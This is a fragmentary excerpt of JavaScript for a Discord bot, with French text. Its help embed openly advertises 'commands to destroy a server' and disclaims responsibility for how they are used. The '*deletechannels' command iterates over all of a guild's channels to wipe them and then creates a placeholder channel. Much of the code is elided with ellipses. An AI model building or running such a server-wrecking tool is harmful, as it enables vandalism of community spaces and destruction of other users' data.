...
client.on('message',  msg => {
    ...
    if(msg.content.startsWith('*deletechannels')){
      ...
      msg.channel.send("Suppression de **" + i + "** salons!")
        msg.guild.channels.cache.forEach(channel => 
            ...
            msg.guild.channels.create("tempo",{type: 'text'})
            .then(console.log)
            .catch(console.error);
    ...
    if(msg.content == "*1help"){
      ...
      .setURL('https://github.com/ziowks')
      .setDescription('Ici vous pouvez trouver toutes les commandes pour détruire un serveur')
      .addField("ZioWks#0001 n'est pas responsables de ce que vous en faites!", 'Utilisation à vos risques et périls!')
      .addField('Commandes', 
      ...
      .setTimestamp()
      .setFooter('Créé par ZioWks', 'https://i.imgur.com/p5OJ0q9.png');
